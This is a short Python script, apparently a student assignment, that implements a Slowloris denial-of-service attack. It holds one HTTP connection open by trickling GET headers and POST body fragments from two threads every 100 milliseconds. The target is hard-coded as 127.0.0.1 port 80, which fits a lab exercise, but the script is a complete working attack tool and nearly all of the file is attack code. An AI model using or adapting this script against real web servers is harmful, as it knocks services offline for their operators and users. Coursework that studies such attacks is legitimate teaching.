# Author: Zane Durkin <durk7832>
# Assignment 6

import socket, string, random, time, threading

chars = string.ascii_letters + string.digits


def make_socket(ip, port):
	"""
	create and return a socket
	"""
	# create socket
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# connect to port
	sock.connect((ip, port))
	return sock

	
def make_standard_get_header():
	"""
	Returns a standard GET header
	"""
	# make standard header 
	output = "GET / HTTP/1.1\r\n"\
			 "Host: localhost\r\n"\
			 "User-Agent: Commodore64\r\n"\
			 "Accept: text/html, application/xhtml+xml\r\n"\
			 "Accept-Language: en-us,en;q=0.5\r\n"\
			 "Accept-Encoding: gzip,deflate\r\n"\
			 "Accept-Charset: ISO-8859-1,utf-8;q=0.7\r\n"\
			 "Keep-Alive: 115\r\n"\
			 "Connection: keep-alive\r\n"
	return output

def make_nonstandard_header():
	"""
	Returns a random number of random non-standard headers
	"""
	output = ""
	number_of_headers = random.randint(0, 4)
	for i in range(number_of_headers):
		output += 'x-'
		output += ''.join(random.choice(chars) for x in range(random.randint(1, 10)))
		output += ': '
		output += ''.join(random.choice(chars) for x in range(random.randint(1, 10)))
		output += "\r\n"
	return output

def make_post_body():
	"""
	Returns random amount of bytes for a body section
	"""
	return ''.join(random.choice(chars) for x in range(random.randint(1, 100))).join("\r\n")
		
def make_standard_post_header():
	"""
	Returns a standard POST header
	"""
	output = "POST / HTTP/1.1\r\n"\
			 "Host: localhost\r\n"\
			 "User-Agent: Commodore64\r\n"\
			 "Accept: text/html, application/xhtml+xml\r\n"\
			 "Accept-Language: en-us,en;q=0.5\r\n"\
			 "Accept-Encoding: gzip,deflate\r\n"\
			 "Accept-Charset: ISO-8859-1,utf-8;q=0.7\r\n"\
			 "Keep-Alive: 115\r\nConnection: keep-alive\r\n"
	return output


def get_loris(sock, milli):
	"""
	Slow Loris attack using GET
	"""
	# Send standard header
	sock.send(make_standard_get_header())
	while True:
		#print("get")
		# send followup header
		sock.send(make_nonstandard_header())
		time.sleep(milli/1000)

def post_loris(sock, milli):
	"""
	Slow Loris attack using POST
	"""
	# Send standard header
	sock.send(make_standard_post_header())
	while True:
		#print("post")
		# send more body info
		sock.send(make_post_body())	
		time.sleep(milli/1000)

def threadIt():
	"""
	Thread the attack
	"""
	# get socket
	sock = make_socket("127.0.0.1", 80)

	# Create a thread for each attack
	get_thread = threading.Thread( target=get_loris, args=(sock, 100) )
	post_thread = threading.Thread( target=post_loris, args=(sock, 100) )
	
	# Daemonize the threads to they will die with the parent
	get_thread.daemon = True
	post_thread.daemon = True

	# start the threads	
	get_thread.start()
	post_thread.start()
	
	# don't kill the parents till the threads are done
	get_thread.join()
	post_thread.join()
	
threadIt()

